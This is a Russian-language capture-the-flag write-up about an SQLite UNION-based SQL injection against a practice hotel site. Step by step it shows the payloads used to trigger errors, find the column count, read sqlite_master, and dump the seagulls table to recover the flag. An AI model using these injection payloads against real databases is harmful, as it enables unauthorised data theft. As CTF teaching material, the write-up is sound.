# Union of crabs and seagulls

## Исследование
Видим перед собой сайт на `flet` (флаттер под питон). Если повбивать разные данные - нам будут выводится разные крабы, которые по истории таска являются постояльцами отеля. Тут можно предположить, что на бэке есть какая-то СУБД, которая отвечает за хранение информации о крабах.


## Эксплуатация

TL;DR; Нужно сделать UNION инъекцию. Название таска является бесплатным хинтом к тому же. 

Этапы эксплуатации:

1) Попытаться вызвать ошибку, чтобы понять формат вулны - Blind Injection или нет.
```
 > INPUT: ' UNION
 < OUTPUT: near "%": Syntax error
```
1) Из этого сообщения мы можем понять, что:
   - Используется LIKE синтаксис
   - Формат ошибки соответствует ошибками sqlite

2) Зная это, пытаемся вытянуть какую-нибудь информацию о таблицах - потому что по-умолчанию у нас и так выводятся все крабы из БД. Добавляем комментарий `--` (комментарий формата sqlite), чтобы закомментировать в запросе правую часть LIKE.
```
 > INPUT: ' UNION Select name, sql FROM sqlite_master --
 < OUTPUT: SELECTs to the left and right of UNION do not have the same number of result columns
```
1) Это означает, что нам нужно подобрать количество столбов в неизвестном нам запросе в приложении. Одна из простых техник - добавлять null-ы, пока у нас не пропадут ошибки из пункта 3. Когда подберем нужное количество столбцов - нам выпадет ошибка о валидации - и из нее мы узнаем что у нас 5 полей в запросе.
```
 > INPUT: ' UNION Select null, null, null, name, sql FROM sqlite_master --
 < OUTPUT: Ошибки валидации - попробуйте этот запрос сами, там длинный текст.
```
1) Подбираем названия столбцов под типы полей. Это может занять время, но в итоге вы получите что-то вроде:
```
 > INPUT: ' UNION Select "a",name, sql, "a", True FROM sqlite_master --
 < OUTPUT: В самом низу странички будут два краба, с названиями таблиц в графе "Номер" и схемой в "Доп инфо"
```
1) В других тасках тут может быть этап изучения схемы нужной нам таблицы. Но в этом таске представление унифицировано, т.е. у нас две одинаковые таблицы с разным названием и разным содержимым.

2) Зная название таблички с чайками - `seagulls`, делаем UNION запрос в нее. Получаем флаг в доп.инфо чайки-босса.
```
 > INPUT: ' UNION Select * FROM seagulls --
 < OUTPUT: В вывод добавится 9 чаек, одна из которых The Boss с флагом в доп. инфо.
```

## Флаг

`crab{UN10N1z3d_s34gulls_*}`